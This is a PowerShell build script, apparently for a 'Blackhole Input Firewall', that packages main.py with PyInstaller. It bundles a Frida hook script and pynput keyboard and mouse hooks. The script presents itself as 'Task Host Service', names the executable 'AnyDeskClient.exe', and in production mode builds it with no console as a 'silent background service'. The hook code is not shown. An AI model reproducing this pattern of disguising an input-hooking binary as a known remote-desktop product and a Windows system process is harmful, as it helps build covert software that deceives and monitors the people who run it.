# ============================================================================
# Blackhole Input Firewall - Build Script (PowerShell)
# Builds the service into a standalone executable using PyInstaller
# ============================================================================

param(
    [switch]$Dev
)

Write-Host ""
Write-Host "========================================"
Write-Host "  Task Host Service - Build"
Write-Host "========================================"
Write-Host ""

# Check if PyInstaller is installed
try {
    python -c "import PyInstaller" 2>$null
    if ($LASTEXITCODE -ne 0) {
        throw "PyInstaller not found"
    }
} catch {
    Write-Host "ERROR: PyInstaller is not installed." -ForegroundColor Red
    Write-Host "Please install it with: pip install pyinstaller"
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

# Clean previous builds
Write-Host "Cleaning previous builds"
if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
if (Test-Path "AnyDeskClient.spec") { Remove-Item -Force "AnyDeskClient.spec" }
Write-Host ""

# Build based on mode
if ($Dev) {
    Write-Host "Building in DEV mode (with console window)"
    Write-Host ""
    
    pyinstaller --onefile `
                --console `
                --name AnyDeskClient `
                --icon windowprogram.ico `
                --add-data "utils/frida_hook.js;utils" `
                --hidden-import=pynput.keyboard._win32 `
                --hidden-import=pynput.mouse._win32 `
                main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    # Create .dev_mode marker in dist folder
    Write-Host "Creating .dev_mode marker in dist folder"
    New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
    Write-Host "  - Created: dist\.dev_mode"
    
    Write-Host ""
    Write-Host "========================================"
    Write-Host "  Build Complete (DEV MODE)"
    Write-Host "========================================"
    Write-Host ""
    Write-Host "Output: dist\AnyDeskClient.exe"
    Write-Host "Dev Marker: dist\.dev_mode"
    Write-Host "Console: VISIBLE (for debugging)"
    Write-Host ""
    Write-Host "To install: .\install.ps1 -Dev"
    Write-Host ""
    
} else {
    Write-Host "Building in PRODUCTION mode (headless, no console)"
    Write-Host ""
    
    pyinstaller --onefile `
                --noconsole `
                --name AnyDeskClient `
                --icon windowprogram.ico `
                --add-data "utils/frida_hook.js;utils" `
                --hidden-import=pynput.keyboard._win32 `
                --hidden-import=pynput.mouse._win32 `
                main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    # Remove .dev_mode marker if it exists from previous dev build
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host "Removed old .dev_mode marker from dist folder"
    }
    
    Write-Host ""
    Write-Host "========================================"
    Write-Host "  Build Complete (PRODUCTION MODE)"
    Write-Host "========================================"
    Write-Host ""
    Write-Host "Output: dist\AnyDeskClient.exe"
    Write-Host "Console: HIDDEN (silent background service)"
    Write-Host ""
    Write-Host "To install: .\install.ps1"
    Write-Host ""
}

Read-Host "Press Enter to exit"

